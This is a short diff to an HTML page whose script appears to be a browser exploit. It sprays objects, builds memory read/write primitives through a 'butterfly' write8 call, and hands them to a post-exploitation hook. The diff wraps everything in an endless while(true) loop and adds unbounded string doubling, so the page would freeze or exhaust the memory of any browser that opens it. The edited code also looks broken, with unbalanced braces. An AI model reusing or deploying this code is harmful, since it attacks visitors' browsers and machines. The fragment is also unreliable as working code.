@@ -5,6 +5,7 @@
 
 <script>
 alert("Start?")
+    while (true){
 function makeid() {
     var text = "";
     var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
@@ -18,9 +19,12 @@ function makeid() {
 var instancespr = [];
 
 for (var i = 0; i < 4096; i++) {
-        let bufferArray = [];
-        bufferArray.push(new ArrayBuffer(1000000)); // Allocate large buffers 
-    if (bufferArray.length > 1000) { bufferArray = []; // Clear buffer array to prevent memory exhaustion
+        let largeString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+            largeString += largeString;
+            if (largeString.length > 1000000000) {
+                largeString = "A".repeat(1000000);
+            }
+        
      //= 50057; /* spray 4-field Object InstanceIDs */
 }
 
@@ -333,9 +337,11 @@ var prim = {
         this.write8(butterfly, new int64(0x41414141, 0xffff0000));
         return rt;
     }
+};
 
 window.primitives = prim;
 if (window.postExpl) window.postExpl();
+    }
 </script>
 </body>
 </html>
